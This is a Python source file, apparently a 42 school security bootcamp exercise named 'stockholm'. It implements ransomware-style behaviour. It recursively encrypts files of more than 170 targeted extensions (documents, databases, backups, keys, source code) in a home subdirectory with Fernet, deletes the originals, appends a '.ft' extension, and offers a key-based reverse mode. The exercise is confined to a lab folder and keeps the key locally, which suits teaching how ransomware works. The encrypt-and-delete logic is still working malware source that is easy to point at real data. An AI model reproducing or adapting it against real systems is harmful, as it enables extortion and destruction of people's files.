#!/usr/bin/env python
# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: cherrero <cherrero@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/08 23:09:23 by cherrero          #+#    #+#              #
#    Updated: 2023/05/09 13:10:20 by cherrero         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import sys
try:
	import argparse
	import os
	from cryptography.fernet import Fernet
	from pathlib import Path
except ModuleNotFoundError:
	sys.exit("\nError: Some libraries were not found. Check the requirements.\n")

def ft_log_write(txt, type='a'):
	'''Write log'''
	try:
		with open(str(Path.home()) + dir_master + log_file, type) as f:
			f.write(txt + "\n")
	except:
		pass

def ft_file(f):
	'''Check if file is valid to encrypt'''
	if os.path.isfile(f):
		for extension in ext:
			if f.endswith(extension):
				return True
	ft_log_write("File skipped: " + f)
	return False

def ft_run_path_encrypt(path):
	'''Encrypt all files in path'''
	for file_name in os.listdir(path):
		file_path = os.path.join(path, file_name)
		if os.path.isdir(file_path):
			ft_run_path_encrypt(file_path)
		else:
			ft_encrypt_file(file_path)
	return

def ft_run_path_decrypt(path):
	'''Decrypt all files in path'''
	for file_name in os.listdir(path):
		file_path = os.path.join(path, file_name)
		if os.path.isdir(file_path):
			ft_run_path_decrypt(file_path)
		else:
			ft_decrypt_file(file_path)
	return

def ft_encrypt_file(file):
	'''Encrypt file'''
	try:
		if ft_file(file):
			ft_log_write("Encrypting file: " + file)
			with open(file, 'rb') as f:
				data = f.read()
			encrypted = Fernet(key).encrypt(data)
			if file.endswith(infection):
				file = file.replace(infection, '')
			with open(file + infection, 'wb') as f:
				f.write(encrypted)
			os.remove(file)
			if args.silent:
				ft_log_write("File encrypted: " + file + infection)
			else:
				print("File encrypted: " + file + infection)
		return
	except:
		sys.exit("\nError encrypting file.\n")

def ft_decrypt_file(file):
	'''Decrypt file'''
	try:
		if file.endswith(infection):
			ft_log_write("Decrypting file: " + file)
			with open(file, 'rb') as f:
				data = f.read()
			decrypted = Fernet(key).decrypt(data)
			file_name = file.split('/')[-1].replace(infection, '')
			file = file.replace(infection, '')
			with open(dir_output + file_name, 'wb') as f:
				f.write(decrypted)
			os.remove(file + infection)
			if args.silent:
				ft_log_write("File decrypted: " + dir_output + file_name)
			else:
				print("File decrypted: " + dir_output + file_name)
		return
	except:
		sys.exit("\nError decrypting file.\n")

def main():

	global key, dir_master, log_file, dir_output, infection, ext, dir, version, args
	version = 'stockholm 1.0.0'
	dir = '/bootcamp/stockholm/infection/'
	output = '/bootcamp/stockholm/infection/'
	dir_master = '/bootcamp/stockholm/'
	log_file = '_stockholm.log'
	key_file = 'master.key'
	infection = '.ft'


	# https://recursos.bps.com.es/files/796/67.pdf
	ext = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt',
	   '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm',
	   '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
	   '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm',
	   '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz',
	   '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef',
	   '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi',
	   '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp',
	   '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas',
	   '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb',
	   '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std',
	   '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw',
	   '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']

	parser = argparse.ArgumentParser(description= version)
	parser.add_argument('-v', '--version', help='version of this program', action="store_true")
	parser.add_argument('-r', '--reverse', type=str, help='reverse the encryption with key [master.key]')
	parser.add_argument('-s', '--silent', help='silent mode', action="store_true")
	parser.add_argument('-d', '--dir', type=str, help='dir where the encrypted files will be saved [/infection/]')
	parser.add_argument('-o', '--output', type=str, help='dir where the decrypted files will be saved [/infection/]')
	parser.add_argument('-log', type=str, help='log name [_stockholm.log]')
	args = parser.parse_args()

	if args.version:
		print(version)
		sys.exit()

	if args.dir:
		dir = args.dir
	path = str(Path.home()) + dir
	path_master = str(Path.home()) + dir_master
	if args.output:
		output = args.output
	dir_output = str(Path.home()) + output
	
	try:
		os.makedirs(path)
	except:
		if os.path.exists(path):
			pass
		else:
			ft_log_write("Error in input directory")
			sys.exit("\nError in input directory.")
	try:
		os.makedirs(dir_output)
	except:
		if os.path.exists(dir_output):
			pass
		else:
			ft_log_write("Error in output directory")
			sys.exit("\nError in output directory.")
	
	ft_log_write("Version: " + version, "w")
	ft_log_write("Path: " + path)

	if args.reverse:
		'''Reverse mode'''
		key_file = args.reverse
		ft_log_write("Reverse mode")
		try:
			with open(path_master + key_file, "rb") as f:
				key = f.read()
				ft_log_write("Key: " + str(key))
		except:
			ft_log_write("Error key")
			sys.exit("\nError key.\n")
		ft_run_path_decrypt(path)
		sys.exit()
	else:
		'''Encryption mode'''
		ft_log_write("Encryption mode")
		key = Fernet.generate_key()
		ft_log_write("Key: " + str(key))
		try:
			with open(path_master + key_file, "wb") as f:
				f.write(key)
		except:
			ft_log_write("Error key")
			sys.exit("\nError key.")
		ft_run_path_encrypt(path)
		sys.exit()

if __name__ == "__main__":
	main()

